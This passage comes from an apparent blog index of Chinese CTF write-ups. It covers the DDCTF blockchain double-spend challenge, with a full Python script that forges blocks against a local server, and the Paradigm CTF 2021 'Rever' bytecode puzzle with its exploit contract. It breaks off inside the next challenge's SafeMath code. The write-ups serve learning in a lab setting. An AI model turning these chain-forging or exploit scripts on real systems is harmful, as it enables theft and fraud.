\"5b6c21275843991fc5ecd900c147a5f1a593d0ee5aebda4739ecca8866bcf990\": &#123;\n        \"nonce\": \"a empty block\",\n        \"prev\": \"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\",\n        \"hash\": \"5b6c21275843991fc5ecd900c147a5f1a593d0ee5aebda4739ecca8866bcf990\",\n        \"transactions\": [],\n        \"height\": 2\n    &#125;,\n    \"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\": &#123;\n        \"nonce\": \"HAHA, I AM THE BANK NOW!\",\n        \"prev\": \"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\",\n        \"hash\": \"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\",\n        \"transactions\": [\n            &#123;\n                \"input\": [\n                    \"c9dd4f71-a9dc-4e78-b32c-2800ec131fcd\"\n                ],\n                \"signature\": [\n                    \"1d16f161e44e4b38cef33f67da0bb9a22f72033304150051d4c31b0d6dc23a0ae698da5ebca3df26e555bb0d2a9ba0ef\"\n                ],\n                \"hash\": \"5079bfd8fa1742a45d08f0be78ca9d79fd4785418c9e66e7857d62d451779a69\",\n                \"output\": [\n                    &#123;\n                        \"amount\": 999999,\n                        \"hash\": \"812d25d4353dbd4fe577f95bd0e2b9c025e869fda429bafaef29e905ab057b21\",\n                        \"addr\": \"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\",\n                        \"id\": \"7637e88e-f204-4218-a06f-e9d7bac7c83f\"\n                    &#125;,\n                    &#123;\n                        \"amount\": 1,\n                        \"hash\": \"7214dfcf889839edcc6f62a45a5dc7f6facee8d07770076a47066cfa31284e56\",\n                        \"addr\": \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\",\n                        \"id\": \"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"\n                    &#125;\n                ]\n            &#125;\n        ],\n        \"height\": 1\n    &#125;,\n    \"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\": &#123;\n        \"nonce\": \"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank\",\n        \"prev\": \"0000000000000000000000000000000000000000000000000000000000000000\",\n        \"hash\": \"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\",\n        \"transactions\": [\n            &#123;\n                \"input\": [],\n                \"signature\": [],\n                \"hash\": \"7cfc30daec2db89d15fa54cea31d2e4c8dc6338b9f48744d49fc6dd98470ddaa\",\n                \"output\": [\n                    &#123;\n                        \"amount\": 1000000,\n                        \"hash\": \"0533f20dcd461947c6491b460e3b21d9bd7ad7a9a9202e28b66085b71c6fe64c\",\n                        \"addr\": \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\",\n                        \"id\": \"c9dd4f71-a9dc-4e78-b32c-2800ec131fcd\"\n                    &#125;\n                ]\n            &#125;\n        ],\n        \"height\": 0\n    &#125;\n&#125;\n\n0x03 analyse初探公链安全，这道题带来的感觉还是很有难度的\n首先来分析一下serve.py的源码，可以构造出如下的一个区块链结构\n题目要求了获得两颗钻石，100w一颗，但是总共发行了100w DDCoin并且还有99w被黑客转走，所以我们需要需要通过双花来实现token多次花费，购买两个钻石，这也就涉及到51%攻击\n51%攻击，在区块链系统之下，矿工只认定最长的那一条区块链，所以如果有一名恶意矿工，拥有全网一半以上的算力，那么他就有更大的概率计算出下一个区块，进而构造出更长的一条区块链，回滚上一条区块的交易，实现货币的二次花费\n\n如上图，黑客进行了花费之后，分叉出一个新的区块，并且快速计算出下一个区块，构建成一个更长的区块链，则花费区块作废，余额回滚至花费之前。\n这道题已经说了，全部矿机已经宕机，所以我们拥有100%的算力，进行两次分叉即可购买两颗钻石\n所以我们如下图构造\n\n清楚了怎么利用51攻击，再次审计使用python实现的blockchain，给出了append_block函数，我们可以像指定区块后添加下一个区块，所以只需要构建我们的攻击区块，实现更长的区块链即可（每次在前端页面创建新的交易会增加区块，同时判断shop时候获得100w ddcoins同时在下一个区块转走这笔钱）\n0x04 Attackfrom functools import reduce\nimport hashlib, json, rsa, uuid, os\nfrom flask import Flask, session, redirect, url_for, escape, request\nimport requests\nimport uuid\n\nEMPTY_HASH = '0' * 64\nDIFFICULTY = int('00000' + 'f' * 59, 16)\n\nurl = \"http://127.0.0.1:9999/b9ca5f959dd7e/\"\nr = requests.get(url=url)\nsession1 = r.headers['Set-Cookie'].split(\";\")[0][8:]\ncookies = &#123;\"session\": session1&#125;\nreq = requests.get(url, cookies=cookies)\nprint(req.text)\n\ngenesis_block=input(\"genesis block:\")\nshop_addr=input(\"shop address:\")\nINPUT=input(\"INPUT ID:\")\nSIGNATURE=input(\"sigature:\")\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n \ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n \ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n \ndef hash_utxo(utxo):\n    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])\n\ndef hash_tx(tx):\n    return reduce(hash_reducer, [\n        reduce(hash_reducer, tx['input'], EMPTY_HASH),\n        reduce(hash_reducer, [utxo['hash']\n                              for utxo in tx['output']], EMPTY_HASH)\n    ])\n\ndef pubkey_to_address(pubkey):\n    assert pubkey.e == 65537\n    hexed = hex(pubkey.n)\n    if hexed.endswith('L'): hexed = hexed[:-1]\n    if hexed.startswith('0x'): hexed = hexed[2:]\n    return hexed\n    \ndef gen_addr_key_pair():\n    pubkey, privkey = rsa.newkeys(384)\n    return pubkey_to_address(pubkey), pubkey,privkey\n\ndef pow_work(block, difficulty, msg=\"\"):\n    nonce = 0\n    while nonce &lt; 2**32:\n        block['nonce'] = msg + str(nonce)\n        block['hash'] = hash_block(block)\n        block_hash = int(block['hash'], 16)\n        if block_hash &lt; difficulty:\n            return block\n        nonce += 1\n\ndef emptyBlock(prevHash, msg):\n    block = &#123;&#125;\n    block['prev'] = prevHash\n    block['transactions'] = []\n    return pow_work(block, DIFFICULTY, msg)\n\ndef fmt_block(block):\n    return json.dumps(block)\n\ndef fill_transaction():\n    utxo = &#123;'id': str(uuid.uuid4()), 'addr': shop_addr, 'amount': 1000000&#125;\n    utxo['hash'] = hash_utxo(utxo)\n    tx = &#123;'input': [INPUT], 'signature': [SIGNATURE], 'output': [utxo]&#125;\n    tx['hash'] = hash_tx(tx)\n    return [tx]\n\ndef headers(session):\n    headers = &#123;\n        \"Host\": \"127.0.0.1:9999\",\n        \"Upgrade-Insecure-Requests\": \"1\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\",\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\",\n        \"Accept-Language\": \"zh-CN,zh;q=0.8\",\n        \"Cookie\": \"session=&#123;&#125;\".format(session),\n        \"Connection\": \"close\",\n        \"Content-Type\": \"application/json\"\n    &#125;\n    return headers\n\nblock1 = &#123;&#125;\nblock1[\"prev\"] = genesis_block\nblock1[\"transactions\"] = fill_transaction()\nblock1 = pow_work(block1, DIFFICULTY)\nact1 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block1), headers=headers(session1))\nprint(act1.content)\nprint(act1.headers)\n\nsession2 = act1.headers['Set-Cookie'].split(\";\")[0][8:]\nblock2 = emptyBlock(block1['hash'], \"empty2\")\nact2 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block2), headers=headers(session2))\nprint(act2.content)\n\nsession3 = act2.headers['Set-Cookie'].split(\";\")[0][8:]\nblock3 = emptyBlock(block2['hash'], \"empty3\")\nact3 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block3), headers=headers(session3))\nprint(act3.content)\n\nsession4 = act3.headers['Set-Cookie'].split(\";\")[0][8:]\nblock4 = emptyBlock(block3['hash'], \"empty4\")\nact4 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block4), headers=headers(session4))\nprint(act4.content)\n\nsession5 = act4.headers['Set-Cookie'].split(\";\")[0][8:]\nblock5 = emptyBlock(block4['hash'], \"empty5\")\nact5 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block5), headers=headers(session5))\nprint(act5.content)\n\nsession6 = act5.headers['Set-Cookie'].split(\";\")[0][8:]\nresult=requests.get(\"http://127.0.0.1:9999/b9ca5f959dd7e/flag\",headers=headers(session6))\nprint(result.content)\n\n运行程序\n照着rep.text天蝎对应的input，获得运行结果\n\nflag：Here is your flag: DDCTF&#123;B10cKch@iN_15_FuN_e53ff95faed&#125;\n\n","slug":"mini_blockchian","date":"2022-12-01T11:52:01.667Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"e4a055270fc77b5d73f92a425173cb60","title":"Paradigm CTF 2021","content":"由于团队的需要，需要复现一下Paradigm CTF 2021。\n\n\n1.ReverCodepragma solidity 0.8.0;\n\ncontract Deployer &#123;\n    constructor(bytes memory code) &#123; assembly &#123; return (add(code, 0x20), mload(code)) &#125; &#125;\n&#125;\n\ncontract Challenge &#123;\n    address public fwd;\n    address public rev;\n    \n    function safe(bytes memory code) private pure returns (bool) &#123;\n        uint i = 0;\n        while (i &lt; code.length) &#123;\n            uint8 op = uint8(code[i]);\n            if (\n                   op == 0x3B // EXTCODECOPY\n                || op == 0x3C // EXTCODESIZE\n                || op == 0x3F // EXTCODEHASH\n                || op == 0x54 // SLOAD\n                || op == 0x55 // SSTORE\n                || op == 0xF0 // CREATE\n                || op == 0xF1 // CALL\n                || op == 0xF2 // CALLCODE\n                || op == 0xF4 // DELEGATECALL\n                || op == 0xF5 // CREATE2\n                || op == 0xFA // STATICCALL\n                || op == 0xFF // SELFDESTRUCT\n            ) return false;\n            \n            if (op >= 0x60 &amp;&amp; op &lt; 0x80) i += (op - 0x60) + 1;\n            \n            i++;\n        &#125;\n        \n        return true;\n    &#125;\n    \n    function flip(bytes memory a) private pure returns (bytes memory) &#123;\n        bytes memory b = new bytes(a.length);\n        for (uint i = 0; i &lt; a.length; i++) &#123;\n            b[b.length - i - 1] = a[i];\n        &#125;\n        return b;\n    &#125;\n\n    function deployOne(bytes memory code) private returns (address) &#123;\n        require(code.length &lt; 101, \"deployOne/code-too-long\");\n        require(safe(code), \"deployOne/code-unsafe\");\n        \n        return address(new Deployer(code));\n    &#125;\n    \n    function deploy(bytes memory code) public  &#123;\n        fwd = deployOne(code);\n        rev = deployOne(flip(code));\n    &#125;\n&#125;\n\ncontract Setup &#123;\n    Challenge public challenge;\n    \n    constructor() &#123;\n        challenge = new Challenge();\n    &#125;\n    \n    function test(string memory what) public view returns (bool) &#123;\n        return test(challenge.fwd(), what) &amp;&amp; test(challenge.rev(), what);\n    &#125;\n    \n    function test(address who, string memory what) public view returns (bool) &#123;\n        bool ok;\n        assembly &#123;\n            ok := staticcall(gas(), who, add(what, 0x20), mload(what), 0x00, 0x00)\n            if ok &#123;\n                if iszero(iszero(returndatasize())) &#123;\n                    let ptr := mload(0x40)\n                    returndatacopy(ptr, 0x00, returndatasize())\n                    ok := mload(ptr)\n                &#125;\n            &#125;\n        &#125;\n        return ok;\n    &#125;\n&#125;\n\nAnalyse做出这道题需要对汇编知识有些理解\n我们首先对题目合约进行分析\n\n梳理一下思路来看，challenge合约中deploy函数创建deployer合约，获得合约地址，并且调用safe函数对于创建时传入的bytecode进行判断，限制,部署的合约不应含有以下功能\nop == 0x3B // EXTCODECOPY\n|| op == 0x3C // EXTCODESIZE\n|| op == 0x3F // EXTCODEHASH\n|| op == 0x54 // SLOAD\n|| op == 0x55 // SSTORE\n|| op == 0xF0 // CREATE\n|| op == 0xF1 // CALL\n|| op == 0xF2 // CALLCODE\n|| op == 0xF4 // DELEGATECALL\n|| op == 0xF5 // CREATE2\n|| op == 0xFA // STATICCALL\n|| op == 0xFF // SELFDESTRUCT\n\ndeploy函数被调用时会部署两个合约，fwd地址为以code部署的合约地址，rev是以reversed(list(code))部署的合约地址，其中flip函数就是将code进行倒序（以字节为单位）\n比如0x1234567890—&gt;0x9078563412\nSetup合约会调用fwd，rev合约，calldata为mload(0x160,0x160+string.length)，之后进行判断returndatasize是否非空，是则执行if，否则直接返回false\nif中执行内容为将指针移动到mload(0x40)，并且将returndata拷贝到ptr中，读取mload(ptr)的值作为返回值。关于mload(0x40)我们可以看下边这一段解释\n\n\n\n\n\n\n\n\n\n As others pointed out, the mload(0x40) returns where the pointer addresses that you can start using it. (free-pointer)\nThe first four 32 bytes (128) are always reserved when your smart contract is deployed. This is the reason your mload(0x40) returns 80. 80 is represented in hex format. It is 128 in decimal, which is where you can start writing in memory! This is how the memory looks like currently.\n\n目前合约部分分析完成，再来看一下python代码部分\nimport eth_sandbox\nfrom weakref import WeakKeyDictionary\nimport web3\nfrom web3 import Web3\nfrom eth_abi import encode_single\nimport random\nimport string\n\ndef random_string(N: int) -> str:\n    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))\n\ndef checker(addr: str, web3: Web3) -> bool:\n    testcases = &#123;\n        \"\": True,\n        \"a\": True,\n        \"ab\": False,\n        \"aba\": True,\n        \"paradigm\": False,\n        \"tattarrattat\": True,\n    &#125;\n\n    for i in range(10):\n        if i % 2 == 0:\n            if random.random() > 0.5:\n                str = random_string(63)\n                testcases[str + random_string(1) + ''.join(reversed(list(str)))] = True\n            else:\n                str = random_string(64)\n                testcases[str + ''.join(reversed(list(str)))] = True\n        else:\n            testcases[random_string(128)] = False\n\n    for k, v in testcases.items():\n        data = web3.sha3(text=\"test(string)\")[:4] + encode_single('uint256', 32) + encode_single('string', k)\n        result = web3.eth.call(\n            &#123;\n                \"to\": addr,\n                \"data\": data,\n            &#125;\n        )\n        if int(result.hex(), 16) != v:\n            return False\n    \n    return True\n\neth_sandbox.run_launcher([\n    eth_sandbox.new_launch_instance_action(deploy_value=Web3.toWei(0, 'ether')),\n    eth_sandbox.new_get_flag_action(checker)\n])\n\n相当于调用test函数，参数为uint256--32，和string--random_string(128)，其中的string有两种生成方式，有一半为true，一半为false，其中true部分判断随机数是否大于0.5，为真将是str=random_string(63)+random_string(1)+reversed(list(str))，否则为str=random_string(64)+reversed(list(str)),false部分直接生成random_string(63)\n自己运行一下看一看\n True\na True\nab False\naba True\nparadigm False\ntattarrattat True\nQWTJSI421LTGK7DIPYTWCIOZKB72AUTWKC5VMG6S17TZ13UIAD5CZAIA1FJ0WGWBBWGW0JF1AIAZC5DAIU31ZT71S6GMV5CKWTUA27BKZOICWTYPID7KGTL124ISJTWQ True\nH7Q0SGZPXLBC8Y405032K9YOGC6LOHY2KOSV098P0WDV5OBNABI467OWJSQKXY971M97I3JHFBRR3TYH0BCQIJRB3CGU3XCZ1K43K1X2F5K4FWDBWC023A3YUUGM5K31 False\nSCEKU7670FB1B3TZDXP31MI2AGFZF3T56HATKRU7IEVVGVGZCWRKLCXE3BSJD06660DJSB3EXCLKRWCZGVGVVEI7URKTAH65T3FZFGA2IM13PXDZT3B1BF0767UKECS True\nQTFOQ4MOR53F3ZVAK3I54LR2NW68TNAVJS8S1PVCQS6LWSJDC3PFJU4CIDFV1G2MI4DKDBWYVPCO4X2DJFQLY76GZISGSRENMRG5M1SNW0ZA2INPMXWNE7O0ALD2Z972 False\nI9N053FHRKGJAZ38LHIPICM8TTKY5PAF45ND7OB513VLDIH10MF0UYANUB9V152KK251V9BUNAYU0FM01HIDLV315BO7DN54FAP5YKTT8MCIPIHL83ZAJGKRHF350N9I True\nMPCEVBOGX6KJ3DTA55FF572FTUHWE029DSI3L2546ESZPR1UVSUHM8KPZNPQ0Y6MJTQM6K1A9GS6KIMQ832WF5Z518272ZZ0VLYCL1ACRM0B993YPOZMLC9W9KQI81PK False\nQTUHXHFZKCSSVZ4KNM139MVJBJAL66BODI9I3XVGSMX2EM8JGJYXBFEAB76D6L2M2L6D67BAEFBXYJGJ8ME2XMSGVX3I9IDOB66LAJBJVM931MNK4ZVSSCKZFHXHUTQ True\nA5XJHVVKLGZQC3JIEVD8JFSOT9IPQ9WCEZ46JAIVOFIZDLQD1DRK5FJKBLULLCZAFLEVLP6YCOOXFYVGSAVGIYGJV8JHD3K5IFAGZIYIBVQPRW3ICD01O7OCUS34ZT24 False\nZ8OP27WJOVCNIBYVGKFJ2BCXSZ5HPLMJAZDN9E5JK03BOUBUPG6RK3VUB1JOGBWTWBGOJ1BUV3KR6GPUBUOB30KJ5E9NDZAJMLPH5ZSXCB2JFKGVYBINCVOJW72PO8Z True\n22JCMPM4MMYRH02XQAAXGW0QCRAYP8HLGRZG6A1WL868XBCFFNP585TJHVAGB0CZ53VZ1EB8RCVAP9ARPS1Z7I3O72KZ5OAPDL7DHBAXPA3KP3PPH7TNRLU7MB9NFE8S False\n\n每次调用的返回值与bool值相等就可以完成挑战，清楚了整体流程，思考一下怎么进行攻击\n在remix中任意参数进行调用test函数，debug一下，执行到第一次staticcall时有以下内存值\nstack:\n[\n\t\"0x00000000000000000000000000000000000000000000000000000000002d5cc5\",\n\t\"0x0000000000000000000000005c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000c0\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000004\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000c0\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000020\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000c4\",\n\t\"0x000000000000000000000000000000000000000000000000000000003ca7255b\",\n\t\"0x0000000000000000000000005c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000001c7\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000080\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000ae\",\n\t\"0x00000000000000000000000000000000000000000000000000000000f9fbd554\"\n]\n\nmemory:\n&#123;\n\t\"0x0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x10\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x20\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x30\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x40\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x50\": \"000000000000000000000000000000c0\\t????????????????\",\n\t\"0x60\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x70\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x80\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x90\": \"00000000000000000000000000000003\\t????????????????\",\n\t\"0xa0\": \"61626100000000000000000000000000\\taba?????????????\",\n\t\"0xb0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0xc0\": \"3ca7255b000000000000000000000000\\t????????????????\",\n\t\"0xd0\": \"00000000000000000000000000000000\\t????????????????\"\n&#125;\n\n所以第一次staticcall的具体情况是stasiccall(gas=0x2d5cc5,to=0x5c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d,in=0xc0,insize=0x04,out=0xc0,outsize=0x20)\ncalldata自然就是memory[0xc0:0xc0+4]也就是0x3ca7255b，根据当前执行判断一下，不难发现这个data就是fwd()的function selector，这样我们清楚了staticcall的结构，接下来看一下第二次stsiccall，得到数据如下\nstack:\n[\n\t\"0x00000000000000000000000000000000000000000000000000000000002d50ef\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000a0\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000003\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000080\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000001c7\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000080\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000ae\",\n\t\"0x00000000000000000000000000000000000000000000000000000000f9fbd554\"\n]\n\nmemory:\n&#123;\n\t\"0x0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x10\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x20\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x30\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x40\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x50\": \"000000000000000000000000000000e0\\t????????????????\",\n\t\"0x60\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x70\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x80\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x90\": \"00000000000000000000000000000003\\t????????????????\",\n\t\"0xa0\": \"61626100000000000000000000000000\\taba?????????????\",\n\t\"0xb0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0xc0\": \"0000000000000000000000006f16a4f3\\t????????????o???\",\n\t\"0xd0\": \"43b671b610476c5dcb740e4c5afcbac1\\tC?q??Gl??t?LZ???\"\n&#125;\n\n所以第二次staticcall调用具体为stasiccall(gas=0x2d50ef,to=0x000000000000000000000000000000000000,in=0xa0,insize=0x03,out=0x00,outsize=0x00)\ncalldata则为memory[0xa0:0xa0+3]也就是0x616261\n再根据之前的分析，我们知道，这个challenge的本意就是对于输入的string是否是回文进行判断，是则true，否则false，所以用100位bytecode写一个回文判断合约就好，构建合约如下：\ncontract atttack&#123;\n    fallback()external&#123;\n        assembly&#123;\n            calldatacopy(0x00, 0x00, calldatasize())\n            let left := 0x00\n            let right := sub(calldatasize(),1)\n            for &#123;&#125; lt(left, right) &#123;&#125; &#123;\n                let left_r := shr(248,mload(left))\n                let right_r := shr(248,mload(right))\n                if iszero(eq(left_r, right_r)) &#123;\n                    mstore(0x00, 0)\n                    return(0x00, 0x20)\n                &#125;\n                left := add(left,0x01)\n                right := sub(right, 0x01)\n            &#125;\n            mstore(0x00, 1)\n            return(0x00, 0x20)\n            &#125;\n        &#125;\n\n&#125;\n\n直接编译，opcode总共有174，显然不符合题目合约code.length &lt; 101的限制，所以我们需要自己用bytecode来实现相同功能\n由于自己实在是太菜，看一下标准答案进行一下参考吧😩\n&#123;           \n    let i := returndatasize()\n    let m := shr(selfbalance(), calldatasize())\n    let e := sub(calldatasize(), selfbalance())\n    for &#123;&#125; and(\n        eq(shr(248, calldataload(i)), shr(248, calldataload(sub(e, i)))),\n        lt(i, m)\n    ) &#123;i := add(i, selfbalance())&#125; &#123;&#125;\n    \n    mstore(callvalue(), eq(i, m))\n    return(callvalue(), 0x20)\n&#125;\n\n由于deploy函数限制了code的长度，所以参考答案中这种写法是别有用意的，直接使用returndatasize，selfbalance即可避免多一次push操作，再用数据也可以直接dup，而不是重新push，节约了字节码(gas)\n自己用bytecode写合约实在是太难了，我们用一个巧办法得到合约的字节码，然后再进行一下分析理解\n写两个合约如下\n//contract 1\ncontract attack&#123;\n    fallback() external&#123;\n        assembly&#123;\n            let i := returndatasize()\n            let m := shr(selfbalance(), calldatasize())\n            let e := sub(calldatasize(), selfbalance())\n            for &#123;&#125; and(\n                eq(shr(248, calldataload(i)), shr(248, calldataload(sub(e, i)))),\n                lt(i, m)\n            ) &#123;i := add(i, selfbalance())&#125; &#123;&#125;\n            \n            mstore(callvalue(), eq(i, m))\n            return(callvalue(), 0x20)\n        &#125;\n    &#125;\n&#125;\n//contract 2\ncontract attack&#123;\n    fallback() external&#123;\n       assembly&#123;\n       \n       &#125;\n    &#125;\n&#125;\n\n分别进行部署得到bytecode，对于大致一样的部分进行分割，再去对于核心逻辑进行分割，returndatasize的opcode是0x3dreturn的opcode是0xf3，获得到的bytecode中只含有一个0x3d以及两个0xf3根据两个合约大致一样的部分进行分割之后即可得到code（也可以这样理解，0xf3一定会在0x3d之后）得到bytecode如下\n3d36471c4736035b8183108382033560f81c843560f81c14161560365747830192506018565b8183143452602034f3\n\n倒置拼接之后发现并不正确，我们来仔细分析一下，首先来看一下deploy的合约的code是什么样的构造\n两次deploy我们用0xabcd和0x做参数，查看真正的部署的code的区别\n0x:\n0x608060405234801561001057600080fd5b506040516101a73803806101a7833981810160405281019061003291906100a2565b805160208201f35b600061004d61004884610114565b6100e3565b90508281526020810184848401111561006557600080fd5b610070848285610144565b509392505050565b600082601f83011261008957600080fd5b815161009984826020860161003a565b91505092915050565b6000602082840312156100b457600080fd5b600082015167ffffffffffffffff8111156100ce57600080fd5b6100da84828501610078565b91505092915050565b6000604051905081810181811067ffffffffffffffff8211171561010a57610109610177565b5b8060405250919050565b600067ffffffffffffffff82111561012f5761012e610177565b5b601f19601f8301169050602081019050919050565b60005b83811015610162578082015181840152602081019050610147565b83811115610171576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fdfe00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000\n0xabcd:\n0x608060405234801561001057600080fd5b506040516101a73803806101a7833981810160405281019061003291906100a2565b805160208201f35b600061004d61004884610114565b6100e3565b90508281526020810184848401111561006557600080fd5b610070848285610144565b509392505050565b600082601f83011261008957600080fd5b815161009984826020860161003a565b91505092915050565b6000602082840312156100b457600080fd5b600082015167ffffffffffffffff8111156100ce57600080fd5b6100da84828501610078565b91505092915050565b6000604051905081810181811067ffffffffffffffff8211171561010a57610109610177565b5b8060405250919050565b600067ffffffffffffffff82111561012f5761012e610177565b5b601f19601f8301169050602081019050919050565b60005b83811015610162578082015181840152602081019050610147565b83811115610171576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fdfe00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002abcd000000000000000000000000000000000000000000000000000000000000\n\n\n发现首先用32字节记录了length，之后在再存储了code，所以在opcode之前有0x20的length\n\n再继续向下分析，for循环执行时，判断条件是否为真，为假则退出循环，而这部分我们查看自己的opcode发现并没有指定位置，我们去寻找退出循环的JUMPDEST为第38位，也就是0x26,这里的0x2a是错误的，进行修改\n再次向下分析，执行完for循环中的内容之后，会执行JUMP无条件跳转，所以我们这里应该是跳转到for循环的开始，也就是第一个JUMPDEST，在opcode中是第七位，而这里执行的却是PUSH1 0x18，显然是不对的，将这里的push值改成0x07\n\n\n（ps：JUMP1以及JUMP的释义如上两图）\n最终得到修改后的code\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3\n倒置拼接之后得到结果：\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\n或：\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\n\n得到结果之后进行攻击合约部署即可\nAttackcontract Exploit &#123;\n    constructor(Setup setup) payable &#123;\n        // setup.challenge().deploy(hex\"3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\");\n        setup.challenge().deploy(hex\"3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\");\n\n        payable(setup.challenge().fwd()).transfer(1);\n        payable(setup.challenge().rev()).transfer(1);\n    &#125;\n&#125;\n\n部署合约，进行测试\n\npython生成的随机数中第一种情况\n\n第二种情况\n\n测试正确，完成挑战！\n2.upgrade\nClick to see more\npragma solidity ^0.6.0;\n\nlibrary SafeMath &#123;\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b &lt;= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart 